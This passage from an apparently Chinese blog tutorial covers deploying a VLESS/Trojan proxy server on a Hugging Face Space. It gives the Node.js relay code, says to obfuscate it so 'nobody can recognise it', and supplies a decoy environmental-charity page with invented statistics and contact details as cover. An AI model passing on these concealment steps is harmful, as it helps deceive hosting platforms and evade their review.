}); } // VLE-SS处理 function handleVlessConnection(ws, msg) { const [VERSION] = msg; const id = msg.slice(1, 17); if (!id.every((v, i) =\u0026gt; v == parseInt(uuid.substr(i * 2, 2), 16))) return false; let i = msg.slice(17, 18).readUInt8() + 19; const port = msg.slice(i, i += 2).readUInt16BE(0); const ATYP = msg.slice(i, i += 1).readUInt8(); const host = ATYP == 1 ? msg.slice(i, i += 4).join(\u0026#39;.\u0026#39;) : (ATYP == 2 ? new TextDecoder().decode(msg.slice(i + 1, i += 1 + msg.slice(i, i + 1).readUInt8())) : (ATYP == 3 ? msg.slice(i, i += 16).reduce((s, b, i, a) =\u0026gt; (i % 2 ? s.concat(a.slice(i - 1, i + 1)) : s), []).map(b =\u0026gt; b.readUInt16BE(0).toString(16)).join(\u0026#39;:\u0026#39;) : \u0026#39;\u0026#39;)); ws.send(new Uint8Array([VERSION, 0])); const duplex = createWebSocketStream(ws); resolveHost(host) .then(resolvedIP =\u0026gt; { net.connect({ host: resolvedIP, port }, function() { this.write(msg.slice(i)); duplex.on(\u0026#39;error\u0026#39;, () =\u0026gt; {}).pipe(this).on(\u0026#39;error\u0026#39;, () =\u0026gt; {}).pipe(duplex); }).on(\u0026#39;error\u0026#39;, () =\u0026gt; {}); }) .catch(error =\u0026gt; { net.connect({ host, port }, function() { this.write(msg.slice(i)); duplex.on(\u0026#39;error\u0026#39;, () =\u0026gt; {}).pipe(this).on(\u0026#39;error\u0026#39;, () =\u0026gt; {}).pipe(duplex); }).on(\u0026#39;error\u0026#39;, () =\u0026gt; {}); }); return true; } // Tro-jan处理 function handleTrojanConnection(ws, msg) { try { if (msg.length \u0026lt; 58) return false; const receivedPasswordHash = msg.slice(0, 56).toString(); const possiblePasswords = [ UUID, ]; let matchedPassword = null; for (const pwd of possiblePasswords) { const hash = crypto.createHash(\u0026#39;sha224\u0026#39;).update(pwd).digest(\u0026#39;hex\u0026#39;); if (hash === receivedPasswordHash) { matchedPassword = pwd; break; } } if (!matchedPassword) return false; let offset = 56; if (msg[offset] === 0x0d \u0026amp;\u0026amp; msg[offset + 1] === 0x0a) { offset += 2; } const cmd = msg[offset]; if (cmd !== 0x01) return false; offset += 1; const atyp = msg[offset]; offset += 1; let host, port; if (atyp === 0x01) { host = msg.slice(offset, offset + 4).join(\u0026#39;.\u0026#39;); offset += 4; } else if (atyp === 0x03) { const hostLen = msg[offset]; offset += 1; host = msg.slice(offset, offset + hostLen).toString(); offset += hostLen; } else if (atyp === 0x04) { host = msg.slice(offset, offset + 16).reduce((s, b, i, a) =\u0026gt; (i % 2 ? s.concat(a.slice(i - 1, i + 1)) : s), []) .map(b =\u0026gt; b.readUInt16BE(0).toString(16)).join(\u0026#39;:\u0026#39;); offset += 16; } else { return false; } port = msg.readUInt16BE(offset); offset += 2; if (offset \u0026lt; msg.length \u0026amp;\u0026amp; msg[offset] === 0x0d \u0026amp;\u0026amp; msg[offset + 1] === 0x0a) { offset += 2; } const duplex = createWebSocketStream(ws); resolveHost(host) .then(resolvedIP =\u0026gt; { net.connect({ host: resolvedIP, port }, function() { if (offset \u0026lt; msg.length) { this.write(msg.slice(offset)); } duplex.on(\u0026#39;error\u0026#39;, () =\u0026gt; {}).pipe(this).on(\u0026#39;error\u0026#39;, () =\u0026gt; {}).pipe(duplex); }).on(\u0026#39;error\u0026#39;, () =\u0026gt; {}); }) .catch(error =\u0026gt; { net.connect({ host, port }, function() { if (offset \u0026lt; msg.length) { this.write(msg.slice(offset)); } duplex.on(\u0026#39;error\u0026#39;, () =\u0026gt; {}).pipe(this).on(\u0026#39;error\u0026#39;, () =\u0026gt; {}).pipe(duplex); }).on(\u0026#39;error\u0026#39;, () =\u0026gt; {}); }); return true; } catch (error) { return false; } } // Ws 连接处理 wss.on(\u0026#39;connection\u0026#39;, (ws, req) =\u0026gt; { const url = req.url || \u0026#39;\u0026#39;; ws.once(\u0026#39;message\u0026#39;, msg =\u0026gt; { if (msg.length \u0026gt; 17 \u0026amp;\u0026amp; msg[0] === 0) { const id = msg.slice(1, 17); const isVless = id.every((v, i) =\u0026gt; v == parseInt(uuid.substr(i * 2, 2), 16)); if (isVless) { if (!handleVlessConnection(ws, msg)) { ws.close(); } return; } } if (!handleTrojanConnection(ws, msg)) { ws.close(); } }).on(\u0026#39;error\u0026#39;, () =\u0026gt; {}); }); httpServer.listen(PORT, () =\u0026gt; { const scheme = tlsOptions ? \u0026#39;HTTPS/WSS\u0026#39; : \u0026#39;HTTP/WS\u0026#39;; console.log(`Server is running on ${scheme} port ${PORT}`); }); 其中几个地方有修改，先看看huggingface给咱们的域名，右边，Settings右边的三个点按钮，\n点开，然后点 Embed this Space\n看src那里，大善人给了咱们一个免费的域名，这个域名是自带证书的！！！我们把域名拷贝下来\n然后根据实际情况修改 index.js\nconst DOMAIN = process.env.DOMAIN || \u0026#39;xxx.qzz.io\u0026#39;; // 填写你最终在cf填写的域名 const SUB_PATH = process.env.SUB_PATH || \u0026#39;sub\u0026#39;; // 获取节点的订阅路径，最好改掉 const TLS_KEY_PATH = process.env.TLS_KEY_PATH || \u0026#39;\u0026#39;; // 善人给了证书，就不用设置了，改成空 const TLS_CERT_PATH = process.env.TLS_CERT_PATH || \u0026#39;\u0026#39;; // 善人给了证书，就不用设置了，改成空 改完后是这样的：\n然后改好了，别急着贴进去：\n去到 去到 https://obfuscator.io/legacy-playground\n贴进去代码，混淆一下，弄成谁也认不得的模样，然后Copy，再贴进去\n然后再建立 package.json 文件\n{ \u0026#34;name\u0026#34;: \u0026#34;js02\u0026#34;, \u0026#34;version\u0026#34;: \u0026#34;0.0.2\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;Nodejs-server\u0026#34;, \u0026#34;main\u0026#34;: \u0026#34;index.js\u0026#34;, \u0026#34;private\u0026#34;: false, \u0026#34;scripts\u0026#34;: { \u0026#34;start\u0026#34;: \u0026#34;node index.js\u0026#34; }, \u0026#34;dependencies\u0026#34;: { \u0026#34;ws\u0026#34;: \u0026#34;^8.14.2\u0026#34;, \u0026#34;axios\u0026#34;: \u0026#34;^1.12.2\u0026#34; }, \u0026#34;engines\u0026#34;: { \u0026#34;node\u0026#34;: \u0026#34;\u0026gt;=14\u0026#34; } } 再建立 index.html 文件, 这是个用来装饰的环保单页面，如果不加，就会显示hello world，太假了，可以让 gemini 给你生成一个，代码如下：\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1.0\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Green Network - Protect Earth\u0026lt;/title\u0026gt; \u0026lt;style\u0026gt; * { margin: 0; padding: 0; box-sizing: border-box; font-family: \u0026#39;Segoe UI\u0026#39;, Tahoma, Geneva, Verdana, sans-serif; } :root { --primary: #2e7d32; --secondary: #4caf50; --accent: #8bc34a; --light: #e8f5e9; --dark: #1b5e20; --text: #333333; --white: #ffffff; } body { background-color: var(--light); color: var(--text); line-height: 1.7; /* Slightly increased line height for readability */ font-size: 16px; } header { background: rgba(46, 125, 50, 0.95); /* Slightly transparent primary color */ color: var(--white); padding: 1rem 0; position: sticky; top: 0; z-index: 100; box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15); /* Enhanced shadow */ } .container { width: 90%; max-width: 1200px; margin: 0 auto; } .nav-container { display: flex; justify-content: space-between; align-items: center; } .logo { display: flex; align-items: center; gap: 10px; font-size: 1.8rem; font-weight: 700; } .logo i { font-size: 2rem; } nav ul { display: flex; list-style: none; } nav ul li { margin-left: 2rem; } nav ul li a { color: var(--white); text-decoration: none; font-weight: 500; transition: all 0.3s ease; padding: 0.5rem 0; position: relative; } nav ul li a:hover { color: var(--accent); } nav ul li a::after { content: \u0026#39;\u0026#39;; position: absolute; bottom: 0; left: 0; width: 0; height: 2px; background-color: var(--accent); transition: width 0.3s ease; } nav ul li a:hover::after { width: 100%; } .hero { background: linear-gradient(rgba(0, 0, 0, 0.6), rgba(0, 0, 0, 0.4)), url(\u0026#39;https://images.unsplash.com/photo-1542601906990-b4d3fb778b09?ixlib=rb-4.0.3\u0026amp;ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D\u0026amp;auto=format\u0026amp;fit=crop\u0026amp;w=2073\u0026amp;q=80\u0026#39;); background-size: cover; background-position: center; height: 80vh; display: flex; align-items: center; text-align: center; color: var(--white); } .hero-content { max-width: 800px; margin: 0 auto; } .hero h1 { font-size: 3.5rem; margin-bottom: 1rem; text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5); } .hero p { font-size: 1.3rem; margin-bottom: 2rem; } .btn { display: inline-block; background-color: var(--accent); color: var(--white); padding: 0.9rem 2.2rem; /* Slightly larger padding */ border-radius: 8px; /* More modern rounded corners */ text-decoration: none; font-weight: 600; transition: all 0.3s ease; border: none; cursor: pointer; box-shadow: 0 6px 10px rgba(0, 0, 0, 0.1); /* Slightly enhanced shadow */ } .btn:hover { background-color: var(--primary); transform: translateY(-5px); /* More pronounced lift effect */ box-shadow: 0 8px 15px rgba(0, 0, 0, 0.2); /* Stronger hover shadow */ } section { padding: 5rem 0; } .section-title { text-align: center; margin-bottom: 3rem; } .section-title h2 { font-size: 2.5rem; color: var(--primary); margin-bottom: 1rem; position: relative; display: inline-block; } .section-title h2::after { content: \u0026#39;\u0026#39;; position: absolute; bottom: -10px; left: 50%; transform: translateX(-50%); width: 90px; /* Slightly wider underline */ height: 5px; /* Thicker underline */ background-color: var(--accent); border-radius: 3px; } .section-title p { color: var(--text); max-width: 700px; margin: 0 auto; font-size: 1.1rem; } .about-content { display: grid; grid-template-columns: 1fr 1fr; gap: 3rem; align-items: center; } .about-img { border-radius: 12px; /* More rounded */ overflow: hidden; box-shadow: 0 12px 25px rgba(0, 0, 0, 0.15); /* Enhanced shadow */ } .about-img img { width: 100%; height: auto; display: block; transition: transform 0.5s ease; } .about-img:hover img { transform: scale(1.08); /* More pronounced zoom */ } .about-text h3 { font-size: 2rem; margin-bottom: 1.5rem; color: var(--dark); } .about-text p { margin-bottom: 1.5rem; font-size: 1.05rem; } .stats { display: grid; grid-template-columns: repeat(4, 1fr); gap: 2rem; margin-top: 4rem; /* More space */ } .stat-item { text-align: center; padding: 2.5rem 1.5rem; /* More padding */ background-color: var(--white); border-radius: 12px; /* More rounded */ box-shadow: 0 8px 20px rgba(0, 0, 0, 0.08); /* Enhanced shadow */ transition: transform 0.3s ease, box-shadow 0.3s ease; } .stat-item:hover { transform: translateY(-12px); /* More pronounced lift */ box-shadow: 0 15px 30px rgba(0, 0, 0, 0.15); /* Stronger hover shadow */ } .stat-item h3 { font-size: 3rem; /* Larger numbers */ color: var(--dark); margin-bottom: 0.8rem; } .stat-item p { color: var(--text); font-size: 1.1rem; } .initiatives { background-color: var(--white); } .initiatives-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 2.5rem; } .initiative-card { background-color: var(--light); border-radius: 12px; /* More rounded */ overflow: hidden; box-shadow: 0 8px 20px rgba(0, 0, 0, 0.08); /* Enhanced shadow */ transition: transform 0.3s ease, box-shadow 0.3s ease; } .initiative-card:hover { transform: translateY(-12px); /* More pronounced lift */ box-shadow: 0 15px 30px rgba(0, 0, 0, 0.15); /* Stronger hover shadow */ } .initiative-img { height: 220px; /* Slightly taller images */ overflow: hidden; } .initiative-img img { width: 100%; height: 100%; object-fit: cover; transition: transform 0.5s ease; } .initiative-card:hover .initiative-img img { transform: scale(1.15); /* More pronounced zoom */ } .initiative-content { padding: 2rem; } .initiative-content h3 { font-size: 1.6rem; margin-bottom: 1rem; color: var(--dark); } .initiative-content p { margin-bottom: 1.8rem; font-size: 1.05rem; } .cta { background: linear-gradient(to right, var(--primary), var(--secondary)); color: var(--white); text-align: center; padding: 6rem 0; /* More padding */ } .cta h2 { font-size: 3rem; /* Larger heading */ margin-bottom: 1.8rem; } .cta p { font-size: 1.3rem; margin-bottom: 2.5rem; max-width: 700px; margin-left: auto; margin-right: auto; } .cta .btn { background-color: var(--white); color: var(--primary); } .cta .btn:hover { background-color: var(--accent); color: var(--white); } footer { background-color: var(--dark); color: var(--white); padding: 4rem 0 2rem; /* More padding */ } .footer-content { display: grid; grid-template-columns: repeat(4, 1fr); gap: 2.5rem; /* More gap */ margin-bottom: 2.5rem; } .footer-column h3 { font-size: 1.4rem; margin-bottom: 1.8rem; position: relative; padding-bottom: 12px; } .footer-column h3::after { content: \u0026#39;\u0026#39;; position: absolute; bottom: 0; left: 0; width: 50px; /* Wider underline */ height: 3px; /* Thicker underline */ background-color: var(--accent); } .footer-column p { margin-bottom: 1.2rem; } .footer-links { list-style: none; } .footer-links li { margin-bottom: 1rem; } .footer-links li a { color: var(--light); text-decoration: none; transition: all 0.3s ease; } .footer-links li a:hover { color: var(--accent); padding-left: 8px; /* More pronounced slide effect */ } .social-links { display: flex; gap: 1.2rem; margin-top: 1.5rem; } .social-links a { display: inline-flex; align-items: center; justify-content: center; width: 50px; /* Larger social buttons */ height: 50px; background-color: rgba(255, 255, 255, 0.15); /* Slightly more visible background */ border-radius: 8px; /* Square with rounded corners */ color: var(--white); text-decoration: none; font-weight: 600; transition: all 0.3s ease; font-size: 0.9rem; } .social-links a:hover { background-color: var(--accent); transform: translateY(-7px); /* More pronounced lift */ } .copyright { text-align: center; padding-top: 2.5rem; border-top: 1px solid rgba(255, 255, 255, 0.15); } .mobile-menu { display: none; font-size: 1.5rem; cursor: pointer; padding: 0.5rem 1rem; border: 1px solid rgba(255, 255, 255, 0.3); border-radius: 5px; transition: all 0.3s ease; } .mobile-menu:hover { background-color: rgba(255, 255, 255, 0.1); } @media (max-width: 992px) { .about-content { grid-template-columns: 1fr; } .initiatives-grid { grid-template-columns: repeat(2, 1fr); } .footer-content { grid-template-columns: repeat(2, 1fr); } .stats { grid-template-columns: repeat(2, 1fr); } } @media (max-width: 768px) { .hero h1 { font-size: 2.8rem; /* Adjusted for better readability on smaller screens */ } .hero p { font-size: 1.2rem; /* Adjusted for better readability on smaller screens */ } nav ul { display: none; position: absolute; top: 100%; left: 0; width: 100%; background-color: var(--primary); flex-direction: column; padding: 1rem 0; text-align: center; box-shadow: 0 5px 10px rgba(0, 0, 0, 0.1); } nav ul.active { display: flex; } nav ul li { margin: 0; padding: 0.8rem 0; } .mobile-menu { display: block; font-size: 1.2rem; /* Slightly smaller for mobile */ padding: 0.4rem 0.8rem; } .initiatives-grid { grid-template-columns: 1fr; } .footer-content { grid-template-columns: 1fr; } .stats { grid-template-columns: 1fr; } .social-links a { width: 45px; /* Slightly smaller social buttons */ height: 45px; font-size: 0.85rem; } } /* Animation for stats counter */ .counter { transition: all 0.5s ease; } \u0026lt;/style\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;!-- Header --\u0026gt; \u0026lt;header\u0026gt; \u0026lt;div class=\u0026#34;container nav-container\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;logo\u0026#34;\u0026gt; \u0026lt;span\u0026gt;Green Network\u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;nav\u0026gt; \u0026lt;div class=\u0026#34;mobile-menu\u0026#34;\u0026gt; Menu \u0026lt;/div\u0026gt; \u0026lt;ul\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;#home\u0026#34;\u0026gt;Home\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;#about\u0026#34;\u0026gt;About\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;#initiatives\u0026#34;\u0026gt;Initiatives\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;#get-involved\u0026#34;\u0026gt;Get Involved\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;#contact\u0026#34;\u0026gt;Contact\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;/ul\u0026gt; \u0026lt;/nav\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/header\u0026gt; \u0026lt;!-- Hero Section --\u0026gt; \u0026lt;section class=\u0026#34;hero\u0026#34; id=\u0026#34;home\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;container hero-content\u0026#34;\u0026gt; \u0026lt;h1\u0026gt;Protect Our Planet, Preserve Our Future\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;Join the global movement to create a sustainable world through conservation, education, and community action.\u0026lt;/p\u0026gt; \u0026lt;a href=\u0026#34;#get-involved\u0026#34; class=\u0026#34;btn\u0026#34;\u0026gt;Join Our Network\u0026lt;/a\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/section\u0026gt; \u0026lt;!-- About Section --\u0026gt; \u0026lt;section id=\u0026#34;about\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;section-title\u0026#34;\u0026gt; \u0026lt;h2\u0026gt;About Green Network\u0026lt;/h2\u0026gt; \u0026lt;p\u0026gt;We are a global community dedicated to environmental protection and sustainable development.\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;about-content\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;about-img\u0026#34;\u0026gt; \u0026lt;img src=\u0026#34;https://images.unsplash.com/photo-1507591064344-4c6ce005b128?ixlib=rb-4.0.3\u0026amp;ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D\u0026amp;auto=format\u0026amp;fit=crop\u0026amp;w=2070\u0026amp;q=80\u0026#34; alt=\u0026#34;Team planting trees\u0026#34;\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;about-text\u0026#34;\u0026gt; \u0026lt;h3\u0026gt;Our Mission\u0026lt;/h3\u0026gt; \u0026lt;p\u0026gt;Green Network is committed to creating a sustainable future by protecting natural ecosystems, promoting renewable energy, and empowering communities to take environmental action.\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;Founded in 2010, we\u0026#39;ve grown from a small grassroots organization to an international network with over 50,000 members across 120 countries.\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;Our approach combines scientific research, community engagement, and policy advocacy to address the most pressing environmental challenges of our time.\u0026lt;/p\u0026gt; \u0026lt;a href=\u0026#34;#\u0026#34; class=\u0026#34;btn\u0026#34;\u0026gt;Learn More\u0026lt;/a\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;stats\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;stat-item\u0026#34;\u0026gt; \u0026lt;h3 class=\u0026#34;counter\u0026#34; data-target=\u0026#34;2500000\u0026#34;\u0026gt;0\u0026lt;/h3\u0026gt; \u0026lt;p\u0026gt;Trees Planted\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;stat-item\u0026#34;\u0026gt; \u0026lt;h3 class=\u0026#34;counter\u0026#34; data-target=\u0026#34;50000\u0026#34;\u0026gt;0\u0026lt;/h3\u0026gt; \u0026lt;p\u0026gt;Active Members\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;stat-item\u0026#34;\u0026gt; \u0026lt;h3 class=\u0026#34;counter\u0026#34; data-target=\u0026#34;120\u0026#34;\u0026gt;0\u0026lt;/h3\u0026gt; \u0026lt;p\u0026gt;Countries Reached\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;stat-item\u0026#34;\u0026gt; \u0026lt;h3 class=\u0026#34;counter\u0026#34; data-target=\u0026#34;1500\u0026#34;\u0026gt;0\u0026lt;/h3\u0026gt; \u0026lt;p\u0026gt;Cleanup Projects\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/section\u0026gt; \u0026lt;!-- Initiatives Section --\u0026gt; \u0026lt;section class=\u0026#34;initiatives\u0026#34; id=\u0026#34;initiatives\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;section-title\u0026#34;\u0026gt; \u0026lt;h2\u0026gt;Our Initiatives\u0026lt;/h2\u0026gt; \u0026lt;p\u0026gt;Discover the key programs and projects we\u0026#39;re implementing to protect our planet.\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;initiatives-grid\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;initiative-card\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;initiative-img\u0026#34;\u0026gt; \u0026lt;img src=\u0026#34;https://dialogue.earth/content/uploads/2021/04/lessons-from-the-rush-to-reforest-china-dialogue-2400x1599.jpg\u0026#34; alt=\u0026#34;Reforestation\u0026#34;\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;initiative-content\u0026#34;\u0026gt; \u0026lt;h3\u0026gt;Global Reforestation\u0026lt;/h3\u0026gt; \u0026lt;p\u0026gt;Planting millions of trees worldwide to restore ecosystems, combat climate change, and protect biodiversity.\u0026lt;/p\u0026gt; \u0026lt;a href=\u0026#34;#\u0026#34; class=\u0026#34;btn\u0026#34;\u0026gt;Learn More\u0026lt;/a\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;initiative-card\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;initiative-img\u0026#34;\u0026gt; \u0026lt;img src=\u0026#34;https://images.unsplash.com/photo-1621451537084-482c73073a0f?ixlib=rb-4.0.3\u0026amp;ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D\u0026amp;auto=format\u0026amp;fit=crop\u0026amp;w=1974\u0026amp;q=80\u0026#34; alt=\u0026#34;Ocean Conservation\u0026#34;\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;initiative-content\u0026#34;\u0026gt; \u0026lt;h3\u0026gt;Ocean Conservation\u0026lt;/h3\u0026gt; \u0026lt;p\u0026gt;Protecting marine ecosystems, reducing plastic pollution, and promoting sustainable fishing practices.\u0026lt;/p\u0026gt; \u0026lt;a href=\u0026#34;#\u0026#34; class=\u0026#34;btn\u0026#34;\u0026gt;Learn More\u0026lt;/a\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;initiative-card\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;initiative-img\u0026#34;\u0026gt; \u0026lt;img src=\u0026#34;https://images.unsplash.com/photo-1508514177221-188b1cf16e9d?ixlib=rb-4.0.3\u0026amp;ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D\u0026amp;auto=format\u0026amp;fit=crop\u0026amp;w=2072\u0026amp;q=80\u0026#34; alt=\u0026#34;Renewable Energy\u0026#34;\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;initiative-content\u0026#34;\u0026gt; \u0026lt;h3\u0026gt;Renewable Energy\u0026lt;/h3\u0026gt; \u0026lt;p\u0026gt;Promoting solar, wind, and other clean energy sources to reduce dependence on fossil fuels.\u0026lt;/p\u0026gt; \u0026lt;a href=\u0026#34;#\u0026#34; class=\u0026#34;btn\u0026#34;\u0026gt;Learn More\u0026lt;/a\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/section\u0026gt; \u0026lt;!-- CTA Section --\u0026gt; \u0026lt;section class=\u0026#34;cta\u0026#34; id=\u0026#34;get-involved\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt; \u0026lt;h2\u0026gt;Join Our Global Movement\u0026lt;/h2\u0026gt; \u0026lt;p\u0026gt;Together, we can create a sustainable future for generations to come. Every action counts, no matter how small.\u0026lt;/p\u0026gt; \u0026lt;a href=\u0026#34;#\u0026#34; class=\u0026#34;btn\u0026#34;\u0026gt;Become a Member\u0026lt;/a\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/section\u0026gt; \u0026lt;!-- Footer --\u0026gt; \u0026lt;footer id=\u0026#34;contact\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;footer-content\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;footer-column\u0026#34;\u0026gt; \u0026lt;h3\u0026gt;Green Network\u0026lt;/h3\u0026gt; \u0026lt;p\u0026gt;We are dedicated to protecting our planet through collaborative action, education, and sustainable solutions.\u0026lt;/p\u0026gt; \u0026lt;div class=\u0026#34;social-links\u0026#34;\u0026gt; \u0026lt;a href=\u0026#34;#\u0026#34;\u0026gt;Facebook\u0026lt;/a\u0026gt; \u0026lt;a href=\u0026#34;#\u0026#34;\u0026gt;Twitter\u0026lt;/a\u0026gt; \u0026lt;a href=\u0026#34;#\u0026#34;\u0026gt;Instagram\u0026lt;/a\u0026gt; \u0026lt;a href=\u0026#34;#\u0026#34;\u0026gt;LinkedIn\u0026lt;/a\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;footer-column\u0026#34;\u0026gt; \u0026lt;h3\u0026gt;Quick Links\u0026lt;/h3\u0026gt; \u0026lt;ul class=\u0026#34;footer-links\u0026#34;\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;#home\u0026#34;\u0026gt;Home\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;#about\u0026#34;\u0026gt;About Us\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;#initiatives\u0026#34;\u0026gt;Initiatives\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;#get-involved\u0026#34;\u0026gt;Get Involved\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;#contact\u0026#34;\u0026gt;Contact\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;/ul\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;footer-column\u0026#34;\u0026gt; \u0026lt;h3\u0026gt;Our Programs\u0026lt;/h3\u0026gt; \u0026lt;ul class=\u0026#34;footer-links\u0026#34;\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;#\u0026#34;\u0026gt;Reforestation\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;#\u0026#34;\u0026gt;Ocean Cleanup\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;#\u0026#34;\u0026gt;Wildlife Protection\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;#\u0026#34;\u0026gt;Climate Education\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;#\u0026#34;\u0026gt;Sustainable Agriculture\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;/ul\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;footer-column\u0026#34;\u0026gt; \u0026lt;h3\u0026gt;Contact Us\u0026lt;/h3\u0026gt; \u0026lt;p\u0026gt;Copper Creek Drive, New York\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;+1 (312) 171-0771\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;support@greennetwork.org\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;copyright\u0026#34;\u0026gt; \u0026lt;p\u0026gt;\u0026amp;copy; 2025 Green Network. All rights reserved.\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/footer\u0026gt; \u0026lt;script\u0026gt; // Mobile Menu Toggle document.querySelector(\u0026#39;.mobile-menu\u0026#39;).addEventListener(\u0026#39;click\u0026#39;, function() { document.querySelector(\u0026#39;nav ul\u0026#39;).classList.toggle(\u0026#39;active\u0026#39;); }); // Counter Animation function animateCounters() { const counters = document.querySelectorAll(\u0026#39;.counter\u0026#39;); const speed = 200; // The lower the slower counters.forEach(counter =\u0026gt; { const target = +counter.getAttribute(\u0026#39;data-target\u0026#39;); const count = +counter.innerText; const inc = target / speed; if(count \u0026lt; target) { counter.innerText = Math.ceil(count + inc); setTimeout(animateCounters, 1); } else { counter.innerText = target; } }); } // Initialize counters when page loads window.addEventListener(\u0026#39;load\u0026#39;, animateCounters); // Smooth scrolling for navigation links document.querySelectorAll(\u0026#39;a[href^=\u0026#34;#\u0026#34;]\u0026#39;).forEach(anchor =\u0026gt; { anchor.addEventListener(\u0026#39;click\u0026#39;, function(e) { e.preventDefault(); const targetId = this.getAttribute(\u0026#39;href\u0026#39;); if(targetId === \u0026#39;#\u0026#39;) return; const targetElement = document.querySelector(targetId); 